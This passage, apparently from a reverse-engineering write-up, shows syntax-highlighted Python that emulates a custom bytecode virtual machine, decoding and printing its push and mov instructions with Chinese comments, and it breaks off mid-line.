class="number">0x00000008</span>, <span class="number">0x00000013</span>, <span class="number">0x00000250</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>,</span><br><span class="line">       <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF8</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE0</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>,</span><br><span class="line">       <span class="number">0x00000004</span>, <span class="number">0xFFFFFFEC</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF8</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE0</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>,</span><br><span class="line">       <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE8</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF0</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>,</span><br><span class="line">       <span class="number">0x00000004</span>, <span class="number">0xFFFFFFDC</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000183</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFDC</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>,</span><br><span class="line">       <span class="number">0x00000004</span>, <span class="number">0xFFFFFFDC</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFDC</span>, <span class="number">0x00000030</span>, <span class="number">0x00000014</span>, <span class="number">0x00000223</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE8</span>, <span class="number">0x00000007</span>,</span><br><span class="line">       <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE8</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>,</span><br><span class="line">       <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE8</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF0</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>,</span><br><span class="line">       <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF4</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF0</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>,</span><br><span class="line">       <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFEC</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFEC</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>,</span><br><span class="line">       <span class="number">0xFFFFFFF0</span>, <span class="number">0x00000003</span>, <span class="number">0x00000003</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFD0</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF0</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFEC</span>,</span><br><span class="line">       <span class="number">0x00000007</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFEC</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>,</span><br><span class="line">       <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFEC</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF0</span>, <span class="number">0x00000007</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x0000000B</span>, <span class="number">0x0000000D</span>,</span><br><span class="line">       <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF4</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>,</span><br><span class="line">       <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF0</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE8</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE8</span>,</span><br><span class="line">       <span class="number">0x00000000</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000175</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF8</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE0</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000003</span>,</span><br><span class="line">       <span class="number">0x00000004</span>, <span class="number">0xFFFFFFEC</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF8</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>,</span><br><span class="line">       <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE0</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE8</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000129</span>,</span><br><span class="line">       <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>]</span><br><span class="line"></span><br><span class="line">reg = [<span class="number">0x0</span>] * <span class="number">11</span></span><br><span class="line">memory = [<span class="number">0x0</span>] * <span class="number">144</span></span><br><span class="line"><span class="comment"># m = str(input())</span></span><br><span class="line">memory[<span class="number">128</span>] = <span class="number">0x34333231</span></span><br><span class="line">memory[<span class="number">129</span>] = <span class="number">0x38373635</span></span><br><span class="line">memory[<span class="number">130</span>] = <span class="number">0x32313039</span></span><br><span class="line">memory[<span class="number">131</span>] = <span class="number">0x36353433</span></span><br><span class="line">memory[<span class="number">132</span>] = <span class="number">0x30393837</span></span><br><span class="line">memory[<span class="number">133</span>] = <span class="number">0x34333231</span></span><br><span class="line">memory[<span class="number">134</span>] = <span class="number">0x38373635</span></span><br><span class="line">memory[<span class="number">135</span>] = <span class="number">0x32313039</span></span><br><span class="line">reg[<span class="number">4</span>] = <span class="number">0x1BF52</span></span><br><span class="line">reg[<span class="number">5</span>] = <span class="number">0x100</span></span><br><span class="line">result = []</span><br><span class="line"><span class="comment"># xmm寄存器为reg[7]~reg[10]</span></span><br><span class="line"><span class="comment"># 读取字节码，reg[6]就是索引</span></span><br><span class="line"><span class="keyword">while</span> reg[<span class="number">6</span>] &lt; <span class="built_in">len</span>(opc):</span><br><span class="line">    <span class="comment"># mov(其实是push)</span></span><br><span class="line">    <span class="keyword">if</span> opc[reg[<span class="number">6</span>]] == <span class="number">0</span>:</span><br><span class="line">        index = (reg[<span class="number">5</span>]-<span class="number">4</span>)//<span class="number">4</span></span><br><span class="line">        reg[<span class="number">5</span>] -= <span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, 作用: mov memory[<span class="subst">&#123;index&#125;</span>], reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>&quot;</span>)</span><br><span class="line">            memory[index] = reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, 作用: mov memory[<span class="subst">&#123;index&#125;</span>], <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            memory[index] = opc[reg[<span class="number">6</span>]+<span class="number">2</span>]</span><br><span class="line">        reg[<span class="number">6</span>] += <span class="number">3</span></span><br><span class="line">    <span class="comment"># end</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, 作用: end of VM&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>, <span class="number">136</span>):</span><br><span class="line">            result.append(memory[j])</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">2</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># mov</span></span><br><span class="line">    <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]] == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: mov memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&#125;</span>, reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">4</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">4</span>]])&#125;</span>&quot;</span>)</span><br><span class="line">            memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>] = reg[opc[reg[<span class="number">6</span>]+<span class="number">4</span>]]</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, 作用: mov reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">3</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]])&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">4</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">2</span>:</span><br><span class="line">            BYTEPlace = ((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)%<span class="number">4</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: mov (<span class="subst">&#123;BYTEPlace&#125;</span>#BYTE)memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>((memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]&amp;(<span class="number">0xFF</span>&lt;&lt;(BYTEPlace*<span class="number">8</span>)))&gt;&gt;BYTEPlace*<span class="number">8</span>)&#125;</span>, reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">4</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> BYTEPlace == <span class="number">0</span>:   memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>] = (memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]&amp;<span class="number">0xFFFFFF00</span>)|((opc[reg[<span class="number">6</span>]+<span class="number">4</span>]&amp;<span class="number">0xFF</span>)&lt;&lt;(<span class="number">8</span>*BYTEPlace))</span><br><span class="line">            <span class="keyword">elif</span> BYTEPlace == <span class="number">1</span>: memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>] = (memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]&amp;<span class="number">0xFFFF00FF</span>)|((opc[reg[<span class="number">6</span>]+<span class="number">4</span>]&amp;<span class="number">0xFF</span>)&lt;&lt;(<span class="number">8</span>*BYTEPlace))</span><br><span class="line">            <span class="keyword">elif</span> BYTEPlace == <span class="number">2</span>: memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>] = (memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]&amp;<span class="number">0xFF00FFFF</span>)|((opc[reg[<span class="number">6</span>]+<span class="number">4</span>]&amp;<span class="number">0xFF</span>)&lt;&lt;(<span class="number">8</span>*BYTEPlace))</span><br><span class="line">            <span class="keyword">elif</span> BYTEPlace == <span class="number">3</span>: memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>] = (memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]&amp;<span class="number">0x00FFFFFF</span>)|((opc[reg[<span class="number">6</span>]+<span class="number">4</span>]&amp;<span class="number">0xFF</span>)&lt;&lt;(<span class="number">8</span>*BYTEPlace))</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: mov reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">3</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, 作用: mov reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">2</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]] = opc[reg[<span class="number">6</span>]+<span class="number">3</span>]</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">4</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span class="number">6</span>]+<span class="number">1</span>] == <span class="number">5</span>:</span><br><span class="line">            BYTEPlace = ((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)%<span class="number">4</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;op: <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">1</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">2</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(opc[reg[<span class="number">6</span>]+<span class="number">4</span>])&#125;</span>, 作用: mov (<span class="subst">&#123;BYTEPlace&#125;</span>#BYTE)memory[<span class="subst">&#123;((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>((memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>]&amp;(<span class="number">0xFF</span>&lt;&lt;(BYTEPlace*<span class="number">8</span>)))&gt;&gt;BYTEPlace*<span class="number">8</span>)&#125;</span>, (BYTE)reg[<span class="subst">&#123;opc[reg[<span class="number">6</span>]+<span class="number">4</span>]&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(reg[opc[reg[<span class="number">6</span>]+<span class="number">4</span>]]&amp;<span class="number">0xFF</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> BYTEPlace == <span class="number">0</span>:   memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>] = ((memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&amp;<span class="number">0xFFFFFF00</span>)+((reg[opc[reg[<span class="number">6</span>]+<span class="number">4</span>]]*<span class="number">0x00000001</span>)&amp;<span class="number">0x000000FF</span>)</span><br><span class="line">            <span class="keyword">elif</span> BYTEPlace == <span class="number">1</span>: memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>] = ((memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&amp;<span class="number">0xFFFF00FF</span>)+((reg[opc[reg[<span class="number">6</span>]+<span class="number">4</span>]]*<span class="number">0x00000100</span>)&amp;<span class="number">0x0000FF00</span>)</span><br><span class="line">            <span class="keyword">elif</span> BYTEPlace == <span class="number">2</span>: memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>] = ((memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&amp;<span class="number">0xFF00FFFF</span>)+((reg[opc[reg[<span class="number">6</span>]+<span class="number">4</span>]]*<span class="number">0x00010000</span>)&amp;<span class="number">0x00FF0000</span>)</span><br><span class="line">            <span class="keyword">elif</span> BYTEPlace == <span class="number">3</span>: memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>] = ((memory[((reg[opc[reg[<span class="number">6</span>]+<span class="number">2</span>]]+opc[reg[<span class="number">6</span>]+<span class="number">3</span>])&amp;<span class="number">0xFFFFFFFF</span>)//<span class="number">4</span>])&amp;<span class="number">0x00FFFFFF</span>)+((reg[opc[reg[<span class="number">6</span>]+<span class="number">4</span>]]*<span class="number">0x01000000</span>)&amp;<span class="number">0xFF000000</span>)</span><br><span class="line">            reg[<span class="number">6</span>] += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opc[reg[<span 